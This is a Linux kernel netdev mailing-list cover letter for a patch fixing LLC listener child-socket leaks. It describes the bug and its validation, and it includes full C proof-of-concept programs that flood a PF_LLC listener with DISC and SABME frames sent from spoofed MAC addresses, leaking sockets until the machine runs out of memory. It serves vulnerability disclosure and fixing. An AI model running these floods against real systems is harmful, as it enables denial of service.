Received: from mail-pz2-f41.google.com (mail-pz2-f41.google.com [74.125.228.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 53AF23B389E
	for <netdev@vger.kernel.org>; Sun, 20 Sep 2026 13:35:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789911326; cv=none; b=esPrdwoYY7DyYvw4siVy3Yu/uaZayhfxJWD+DbSJepmPX8WDhuIu9C10m3n0JpPH4g7hctFbo25Ej953rctHTv+SqHk6CvN1XkYfJt/j1Eh1i3Tnxh0uFxYmmGTTdQ425SjsknVbQefEIYdMlGLLqVLJ4U0Q9IWQOhxd8b/xN9M=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789911326; c=relaxed/simple;
	bh=/9aG2TGodjRj5N5GipdbfMRot+YrHd4+nukN/9/w+1U=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=OFZWzicY+9TJ+8Inb2qpGeIQD9k4Pli1jAmM4TOspuW2wsTSZhOVZ+d152KxOUs4aiLFeUoccVx+QmljwWfPeYNp+oz+4EQg7XAJDHwoMsNYPfO5+i4ZHoq6NWgE0V2t104g7fBG/SSJlWL5UEEjOsIxBFpqLyHp/Nlx2Vweb4M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=UXxT9+O7; arc=none smtp.client-ip=74.125.228.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="UXxT9+O7"
Received: by mail-pz2-f41.google.com with SMTP id d2e1a72fcca58-85469a3490bso2348945b3a.3
        for <netdev@vger.kernel.org>; Sun, 20 Sep 2026 06:35:20 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789911318; x=1790516118; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=l/M75c/DdKs3UZ2gx2aVlnKHobSHqJIp0AccRZxThzo=;
        b=UXxT9+O79S1u0bBk6X11D9dCs6Fe+xjy/kkZ4N3fevLGp/5YkEvb7V41KRSIs7KqrO
         r7D0N0qaRFWThfWkrsB+oFgypZ9hfIuvJcP+euWHWeXpgXcF+G7bOSYMN1rdhDUUsb6G
         XeIUtyNDkutHCa5ERkIZ2JBV8XOvxO1LSbTVb38W2WGgAH1A2k2ieKNSYOMjhZfIUyyV
         04q9LKiRCv2uwBHx54oG2poqtHsS1+gftHQ+wLd/OMqRUKLZSp0XVkpix9QzwPogECGn
         7Iku1meAO1JBnddXtVQ5l1l+wWZ18ppclY0wJ+LJHh1XfFrpYFK+uFsoiz4eTZ2bbe4i
         bYcg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789911318; x=1790516118;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=l/M75c/DdKs3UZ2gx2aVlnKHobSHqJIp0AccRZxThzo=;
        b=mUgGpnktUmrQ40+uHD0/CM4i8+qWJhg+b5Ben+xlLn6n8xh32OSPtwl9cAVmqh0Ko0
         eG0vxEwjm6Uv54DcARmko6JzPK3QzsFNedWOU9xurS8WjL4YXRYJSeZp5Lax7tvN8wLM
         TJnN6oCWlZJuHkn2RBa8MYCqcvIagkcsL7tnRHxyGnLP82W/KoDLBGmqJUFmYqoKssEN
         01E9NEYB8fiRODvmAEDiDruocQGgfL5chzBHejrLdgL7zvz19dhgsbIv6ah3tvkjZYLQ
         jvMFZasCbSZeKdnDP5QC+/KXzael/q3uDSFT8euoGx8PjwGAMseM8+d8S6+Q58VkRnAG
         RTig==
X-Gm-Message-State: AFuF++ncuM0eOe4ZRNZ9zi6fD69hgdgT5/Zfy89kw/rEhLHHEqM1bUV8
	s4F2/GrUJAl6e4tp0mWqXzSm4XmoUQAi7rMJ8D/3LjV7v3swjpQXX+Ajd7BYz3L1oHuA0Sg38PE
	uX7/sZZhl
X-Gm-Gg: AYBFou2w4fg3PnOsk7oOWRZSyLb8P1UeUIlAmTfMISqe/4RiBCjQWu9GvoSTvRSABHO
	W2Dd9oAoHp6/KnSrSfHVJqbIKE26kTJNl991iFwnQo0zxe/avuIdug20fUJDIyMlYrQeyO5iHHd
	0Z5Ca3Qcta1oXyK18FYYYHYLC5qc10A9v0v3Cyvi4MapiaUiXwRX675jiKEMBe4hcT9ot3Ev7/P
	BJgTqgbYWFmodyJsPWJ/CGOSJh8bpioeTXiBSY8huQyrOXF69Lqd72UE5N5GMwo1CxmQfJ6NUYI
	vJ6GlTnLXr8q4ndSG7eJPvMC58SavvvpVpI+Ucu+rYKngB8juo6h8HBmIRG2Zbdgxs3Jmay0EFu
	aMDeoZSOPXOxDmVPolxUtne/gKtz9dPUzoce/gudu4syH10JucsCzuGHCPWX04Ter516V0p3eNr
	FS+3gEMx9HqKd+6IcWfZGNMaS+ifNNwuZyX12SjgIZrqr+5SGSkTPeOVXoS3yddkpP5slijpw+u
	TIuQqYyxfO+c+0huJPHETzf3cGw8MEC/WDl7NCL
X-Received: by 2002:a05:6a20:3956:b0:3dd:a196:69de with SMTP id adf61e73a8af0-3dda19677d8mr6342846637.57.1789911318030;
        Sun, 20 Sep 2026 06:35:18 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc72ae70637sm2122055a12.6.2026.09.20.06.35.13
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 20 Sep 2026 06:35:16 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: zihanx@nebusec.ai,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH net v10 0/1] llc: fix listener child socket leaks
Date: Sun, 20 Sep 2026 13:35:06 +0000
Message-ID: <cover.1789824800.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,

We found and validated a issue in net/llc/llc_conn.c. The reproducer
requires CAP_NET_RAW and CAP_NET_ADMIN in init_net.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() used to create and publish a child socket as soon as a
frame matched a listening PF_LLC socket. llc_create_incoming_sock()
published that child in the SAP tables and held a device reference before
the frame was known to be a passive-open request.

A listener-directed non-SABME frame does not produce an
LLC_CONN_PRIM indication. The child therefore cannot reach accept(), and
its SAP and device references can remain after the packet and listener
are gone. The DISC path is the original leak trigger: a PF_LLC
SOCK_STREAM listener receives DISC commands with distinct source MAC
addresses, causing a child to be published for each tuple.

The same publication point also left valid SABME children exposed to
failure paths. A state-machine failure could leave a published child
without a connection indication. When the listener was user-owned, a
backlog enqueue failure could occur after publication. Listener close
could free the indication skb without releasing the child socket. The
listener did not account these indications against sk_max_ack_backlog,
so SABME traffic was not bounded by listen(2).

The v10 LLC fixes the complete child lifecycle while preserving the
passive-open tuple lookup requirement. Only SABME commands create
children. DISC commands and other P=3D1 commands are answered directly
from the listener with a DM response addressed to the source address
decoded from the received packet. Other non-SABME frames are dropped
before they enter the listener's ADM state machine.

For a directly received SABME, the child is socket-locked before it is
hashed. If llc_conn_state_process() fails, the child is unlinked,
marked out of service, and its device, SAP, and socket references are
released. If the listener is user-owned, the original skb is placed on
the listener backlog without a child; llc_backlog_rcv() performs the
accept-queue check and creates the child only after backlog admission has
succeeded.

Successful LLC_CONN_PRIM indications increment the listener accept
backlog, and accept() removes that accounting. During listener teardown,
the receive queue is walked. Each indication skb is freed first so its
sock_rfree() accounting still refers to the child, then the child is
locked with bottom halves disabled, removed from the SAP, and released.
Packets that race with teardown either see the child lock and its
out-of-service state or no longer find it hashed. The receive path also
rejects stale and out-of-service lookup results before state-table
dispatch.

The llc_ui_accept() skb_dequeue() NULL-dereference concern remains a
separate issue and is not changed by this patch.

The child PoCs below are real artifacts. The v10 LLC source was rebuilt from
commit 24d93c5373c7. The resulting kernel reported
7.2.0-rc4-g24d93c5373c7. The three PoCs were compiled statically, and the
final 2 vCPU, 2 GB QEMU run passed the SABME accept, listener-close,
accept-backlog, and 110000-frame DISC checks. The final
/proc/net/llc/socket table had no leftover entries. The final serial log
contained no BUG, Oops, panic, or KASAN report; KASAN was not enabled in
this validation kernel.

The decoded crash log below is from a separate unfixed Linux v6.12.74 QEMU
run with 2 GiB of guest RAM. In that run, panic_on_oom was set to 2 and the
DISC PoC sent 110000 frames. The log was decoded with the matching v6.12.74
vmlinux using scripts/decode_stacktrace.sh. It is not output from the v10
fixed kernel; the fixed-kernel validation produced no crash log.

The child publication and device-reference behavior were introduced in
1da177e4c3f4 ("Linux-2.6.12-rc2") and retained by
d389424e00f9 ("[LLC]: Fix the accept path"). Fixes therefore points to
1da177e4c3f4.

PF_LLC socket creation is restricted to init_net. The PF_LLC listener and
the AF_PACKET injector require CAP_NET_RAW; CAP_NET_ADMIN is needed to
create and configure the veth pair. Writing
/proc/sys/vm/panic_on_oom requires CAP_SYS_ADMIN and is used only for the
separate unfixed-kernel OOM run. The actual reproducer runs as root in
init_net. unshare -Urn is not used because PF_LLC socket creation returns
EAFNOSUPPORT outside init_net. The reproducer therefore sets up a veth pair
and injects AF_PACKET frames in init_net.

packetdrill was not used because the trigger combines a PF_LLC listening
socket, AF_PACKET injection, a veth pair, and rotating source MAC
addresses to create distinct passive-open tuples. The C PoCs show that
combined resource-leak and lifecycle paths directly.

Reproducer:

The generic template commands are retained below for cover-letter format;
they are not the actual PF_LLC command sequence:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

The actual PF_LLC command sequence, run as root in init_net, is:

    gcc -O2 -static -o poc poc.c
    gcc -O2 -static -o poc-sabme poc-sabme.c
    gcc -O2 -static -o poc-backlog verify/poc-backlog.c

    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up
    ./poc llc_rx0 llc_tx0 100
    wc -l /proc/net/llc/socket
    ./poc-sabme accept llc_rx0 llc_tx0
    ./poc-sabme close llc_rx0 llc_tx0 100
    ./poc-backlog llc_rx0 llc_tx0 1 10

For the unfixed-kernel OOM evidence, use a fresh unfixed guest after
compiling the PoC and setting up the veth pair. With CAP_SYS_ADMIN, set
panic_on_oom before the long DISC flood:

    # fresh unfixed guest
    echo 2 > /proc/sys/vm/panic_on_oom
    ./poc llc_rx0 llc_tx0 110000

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd =3D socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd =3D socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac=
[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd =3D socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family =3D AF_LLC;
	addr.sllc_arphrd =3D ARPHRD_ETHER;
	addr.sllc_sap =3D sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one =3D 1;
	int ifindex =3D get_ifindex(ifname);

	fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_protocol =3D htons(ETH_P_ALL);
	sll.sll_ifindex =3D ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out =3D ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] =3D 0x02;
	mac[1] =3D (n >> 32) & 0xff;
	mac[2] =3D (n >> 24) & 0xff;
	mac[3] =3D (n >> 16) & 0xff;
	mac[4] =3D (n >> 8) & 0xff;
	mac[5] =3D n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if =3D DEFAULT_RX_IF;
	const char *tx_if =3D DEFAULT_TX_IF;
	uint64_t count =3D 0;
	uint64_t i =3D 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if =3D argv[1];
	if (argc > 2)
		tx_if =3D argv[2];
	if (argc > 3) {
		char *end =3D NULL;

		errno =3D 0;
		count =3D strtoull(argv[3], &end, 0);
		if (errno || !end || *end !=3D '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd =3D make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd =3D make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto =3D htons(3);
	frame[ETH_HLEN + 0] =3D DEFAULT_SAP;
	frame[ETH_HLEN + 1] =3D 0x04;
	frame[ETH_HLEN + 2] =3D 0x43; /* DISC command, P/F=3D0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_ifindex =3D ifindex;
	sll.sll_halen =3D ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=3D%s sender_if=3D%s sap=3D0x%02x count=3D%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=3D%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <=3D count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^=3D 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=3D%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

------BEGIN poc-sabme.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac=
[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd =3D socket(AF_LLC, SOCK_STREAM, 0);

	if (fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(ifname, mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family =3D AF_LLC;
	addr.sllc_arphrd =3D ARPHRD_ETHER;
	addr.sllc_sap =3D sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");
	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int one =3D 1;
	int ifindex =3D get_ifindex(ifname);
	int fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_protocol =3D htons(ETH_P_ALL);
	sll.sll_ifindex =3D ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");
	*ifindex_out =3D ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] =3D 0x02;
	mac[1] =3D (n >> 32) & 0xff;
	mac[2] =3D (n >> 24) & 0xff;
	mac[3] =3D (n >> 16) & 0xff;
	mac[4] =3D (n >> 8) & 0xff;
	mac[5] =3D n & 0xff;
}

static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[=
ETH_ALEN],
		       const unsigned char src[ETH_ALEN])
{
	static unsigned char frame[ETH_ZLEN];
	struct sockaddr_ll sll;

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst, ETH_ALEN);
	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto =3D htons(3);
	frame[ETH_HLEN + 0] =3D DEFAULT_SAP;
	frame[ETH_HLEN + 1] =3D 0x04;
	frame[ETH_HLEN + 2] =3D SABME_CMD;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_ifindex =3D ifindex;
	sll.sll_halen =3D ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);
	if (sendto(packet_fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("sendto(AF_PACKET)");
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
}

int main(int argc, char **argv)
{
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	const char *mode;
	const char *rx_if =3D DEFAULT_RX_IF;
	const char *tx_if =3D DEFAULT_TX_IF;
	uint64_t count =3D 1;
	uint64_t i;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc < 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	mode =3D argv[1];
	if (argc > 2)
		rx_if =3D argv[2];
	if (argc > 3)
		tx_if =3D argv[3];
	if (argc > 4) {
		char *end =3D NULL;

		errno =3D 0;
		count =3D strtoull(argv[4], &end, 0);
		if (errno || !end || *end !=3D '\0' || !count) {
			fprintf(stderr, "invalid count: %s\n", argv[4]);
			return EXIT_FAILURE;
		}
	}

	listener_fd =3D make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd =3D make_packet_socket(tx_if, &ifindex);
	fprintf(stderr, "mode=3D%s listener_if=3D%s sender_if=3D%s count=3D%llu\n",
		mode, rx_if, tx_if, (unsigned long long)count);

	if (!strcmp(mode, "accept")) {
		int child;
		struct sockaddr_llc addr;
		socklen_t addrlen =3D sizeof(addr);
		struct timeval tv =3D { .tv_sec =3D 5, .tv_usec =3D 0 };

		fill_src_mac(src_mac, 1);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^=3D 1;
		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		child =3D accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
		if (child < 0)
			die_errno("accept(AF_LLC)");
		printf("SABME passive open accepted\naccept_rc=3D0\n");
		close(child);
		close(packet_fd);
		close(listener_fd);
		return 0;
	}

	if (!strcmp(mode, "close")) {
		for (i =3D 1; i <=3D count; i++) {
			fill_src_mac(src_mac, i);
			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
				src_mac[ETH_ALEN - 1] ^=3D 1;
			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		}
		close(packet_fd);
		close(listener_fd);
		printf("SABME sent without accept and listener closed\n");
		return 0;
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}
------END poc-sabme.c--------

------BEGIN poc-backlog.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int llc_socket_count(void)
{
	FILE *fp =3D fopen("/proc/net/llc/socket", "r");
	char line[256];
	int count =3D 0;

	if (!fp)
		return -1;
	if (!fgets(line, sizeof(line), fp)) {
		fclose(fp);
		return -1;
	}
	while (fgets(line, sizeof(line), fp))
		count++;
	fclose(fp);
	return count;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] =3D 0x02;
	mac[1] =3D (n >> 32) & 0xff;
	mac[2] =3D (n >> 24) & 0xff;
	mac[3] =3D (n >> 16) & 0xff;
	mac[4] =3D (n >> 8) & 0xff;
	mac[5] =3D n & 0xff;
}

int main(int argc, char **argv)
{
	const char *rx_if =3D argc > 1 ? argv[1] : "llc_rx0";
	const char *tx_if =3D argc > 2 ? argv[2] : "llc_tx0";
	int backlog =3D argc > 3 ? atoi(argv[3]) : 1;
	int nframes =3D argc > 4 ? atoi(argv[4]) : 10;
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_llc addr;
	struct sockaddr_ll sll;
	static unsigned char frame[ETH_ZLEN];
	int listener_fd, packet_fd, ifindex, one =3D 1, i, after_send, after_close;
	int expected_max;

	listener_fd =3D socket(AF_LLC, SOCK_STREAM, 0);
	if (listener_fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(rx_if, dst_mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family =3D AF_LLC;
	addr.sllc_arphrd =3D ARPHRD_ETHER;
	addr.sllc_sap =3D DEFAULT_SAP;
	memcpy(addr.sllc_mac, dst_mac, ETH_ALEN);
	if (bind(listener_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(listener_fd, backlog) < 0)
		die_errno("listen(AF_LLC)");

	ifindex =3D get_ifindex(tx_if);
	packet_fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (packet_fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(packet_fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_protocol =3D htons(ETH_P_ALL);
	sll.sll_ifindex =3D ifindex;
	if (bind(packet_fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	for (i =3D 1; i <=3D nframes; i++) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^=3D 1;
		memset(frame, 0, sizeof(frame));
		memcpy(frame, dst_mac, ETH_ALEN);
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
		((struct ethhdr *)frame)->h_proto =3D htons(3);
		frame[ETH_HLEN + 0] =3D DEFAULT_SAP;
		frame[ETH_HLEN + 1] =3D 0x04;
